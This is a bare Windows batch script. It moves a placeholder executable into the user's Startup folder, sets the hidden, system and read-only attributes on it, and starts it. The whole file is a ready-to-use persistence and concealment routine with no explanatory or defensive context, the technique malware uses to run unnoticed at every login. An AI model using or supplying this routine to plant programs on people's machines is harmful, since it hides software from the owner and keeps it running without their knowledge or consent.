@echo off

move {Your Executable File Name} "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
attrib +r +h +s "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{Your Executable File Name}"
start C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\{Your Executable File Name}

exit